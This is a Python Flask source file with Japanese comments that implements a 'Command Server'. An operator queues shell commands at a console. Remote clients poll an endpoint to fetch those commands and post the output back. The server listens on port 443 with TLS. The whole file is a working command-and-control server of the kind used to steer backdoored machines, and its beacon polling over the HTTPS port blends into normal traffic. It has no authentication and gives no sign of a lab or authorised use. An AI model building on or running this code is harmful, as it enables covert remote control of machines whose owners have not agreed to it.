from flask import Flask, request, jsonify
from threading import Thread, Lock
import queue
import time
import sys
import logging

app = Flask(__name__)

# Flaskのログレベルを設定（アクセスログを抑制）
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

command_queue = queue.Queue()
last_client_id = None
last_seen_time = 0
prompt_lock = Lock()

# クライアント検知された時に通知し、プロンプト変更
def update_prompt(client_id):
    global last_client_id, last_seen_time
    with prompt_lock:
        # 新しいクライアントが接続した場合
        if last_client_id != client_id:
            last_client_id = client_id
            print(f"\n[connected] {client_id}")
            sys.stdout.write(f"[server:{client_id}] > ")
            sys.stdout.flush()
        
        # 常に最終アクセス時間を更新
        last_seen_time = time.time()

# タイムアウトでプロンプトを元に戻す
def monitor_timeout():
    global last_client_id
    while True:
        time.sleep(5)
        with prompt_lock:
            if last_client_id and (time.time() - last_seen_time > 10):  # タイムアウトを10秒に設定
                print(f"\n[timeout] {last_client_id} disconnected.")
                last_client_id = None
                sys.stdout.write("[server] > ")
                sys.stdout.flush()

# コマンド入力用スレッド
def command_input():
    global last_client_id
    while True:
        with prompt_lock:
            prompt = f"[server:{last_client_id}] > " if last_client_id else "[server] > "
        cmd = input(prompt)
        if cmd:
            command_queue.put(cmd)

@app.route("/fetch_command", methods=["GET"])
def fetch_command():
    client_id = request.args.get("id", "unknown")
    update_prompt(client_id)

    if not command_queue.empty():
        return jsonify({"command": command_queue.get()})
    return "", 204

@app.route("/post_result", methods=["POST"])
def post_result():
    data = request.get_json()
    print(f"\n[client result] from {data.get('id')}:")
    print(data.get("output"))

    with prompt_lock:
        sys.stdout.write(f"[server:{data.get('id')}] > ")
        sys.stdout.flush()
    return "OK", 200

if __name__ == "__main__":
    print("=== Command Server 起動 ===")
    Thread(target=command_input, daemon=True).start()
    Thread(target=monitor_timeout, daemon=True).start()
    app.run(host="0.0.0.0", port=443, ssl_context=('cert.pem', 'key.pem')) 